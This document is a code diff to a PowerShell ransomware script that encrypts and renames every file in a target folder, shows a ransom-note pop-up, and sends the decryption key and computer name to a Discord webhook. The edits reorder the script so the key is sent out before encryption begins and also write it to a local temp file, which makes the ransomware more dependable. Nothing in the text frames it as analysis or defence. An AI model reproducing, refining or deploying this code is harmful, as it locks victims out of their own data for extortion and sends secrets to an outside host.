@@ -51,6 +51,15 @@ $Key.IV = $IVBytes
 $KeyBytes = $Key.Key
 $KeyString = [System.Convert]::ToBase64String($KeyBytes)
 
+# Save key to a local temp file (FAILSAFE)
+"Decryption Key: $KeyString" | Out-File -FilePath $env:tmp/key.log -Append
+
+# Define the body of the message and convert it to JSON
+$body = @{"username" = "$env:COMPUTERNAME" ;"content" = "Decryption Key: $KeyString"} | ConvertTo-Json
+
+# Use 'Invoke-RestMethod' command to send the message to Discord
+IRM -Uri $whuri -Method Post -ContentType "application/json" -Body $body
+
 # Encrypt each file in the source folder (recursive)
 Get-ChildItem -Path $SourceFolder -File -Recurse | ForEach-Object {
     $File = $_
@@ -68,11 +77,8 @@ foreach ($file in $files) {
     Rename-Item -Path $file.FullName -NewName $newName
 }
 
-# Define the body of the message and convert it to JSON
-$body = @{"username" = "$env:COMPUTERNAME" ;"content" = "Decryption Key: $KeyString"} | ConvertTo-Json
-
-# Use 'Invoke-RestMethod' command to send the message to Discord
-IRM -Uri $whuri -Method Post -ContentType "application/json" -Body $body
+# Generate the indcator file (for pop-up close detection)
+"indicate" | Out-File -FilePath $env:tmp/indicate -Append
 
 # POP-UP / RANSOM NOTE
 # Define code for the pop-up
@@ -140,9 +146,6 @@ $ToFile | Out-File -FilePath $env:tmp/win.ps1 -Append
 # Save pop-up initialization code to file
 $VbsPath = "$env:tmp\service.vbs"
 $ToVbs | Out-File -FilePath $VbsPath -Force
-
-# Generate the indcator file (for pop-up close detection)
-"indicate" | Out-File -FilePath $env:tmp/indicate -Append
 
 # START POP-UP AND CLEAN UP
 # Start pop-up window
